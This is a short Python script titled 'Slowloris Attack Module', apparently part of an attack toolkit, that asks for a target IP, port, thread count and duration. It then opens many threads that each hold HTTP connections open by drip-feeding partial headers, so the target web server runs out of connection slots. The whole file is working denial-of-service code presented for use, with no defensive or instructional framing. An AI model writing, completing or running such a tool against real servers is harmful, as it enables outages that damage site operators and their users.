#!/usr/bin/env python3
# Slowloris Attack Module

import socket, random, time, threading

def run():
    print("\n" + "="*60)
    print("SLOWLORIS ATTACK")
    print("="*60)
    
    target_ip = input("Target IP: ").strip()
    target_port = int(input("Target Port [80]: ").strip() or "80")
    threads = int(input("Threads [200]: ").strip() or "200")
    duration = int(input("Duration (seconds) [60]: ").strip() or "60")
    
    stop_event = threading.Event()
    sockets = []
    
    def flood():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.send(b"GET / HTTP/1.1\r\n")
            s.send(b"Host: " + target_ip.encode() + b"\r\n")
            s.send(b"Connection: keep-alive\r\n")
            s.send(b"X-Header: " + random._urandom(100) + b"\r\n")
            sockets.append(s)
            
            end_time = time.time() + duration
            while time.time() < end_time and not stop_event.is_set():
                try:
                    s.send(b"X-Header: " + random._urandom(100) + b"\r\n")
                    time.sleep(5)
                except:
                    break
            s.close()
        except:
            pass
    
    print(f"\nStarting Slowloris on {target_ip}:{target_port}")
    print(f"Threads: {threads} | Duration: {duration}s")
    
    for i in range(threads):
        threading.Thread(target=flood, daemon=True).start()
        time.sleep(0.01)
    
    try:
        time.sleep(duration)
        stop_event.set()
        print(f"\nSlowloris completed! {len(sockets)} connections established")
    except KeyboardInterrupt:
        stop_event.set()
        print("\nStopped by user")

if __name__ == "__main__":
    run()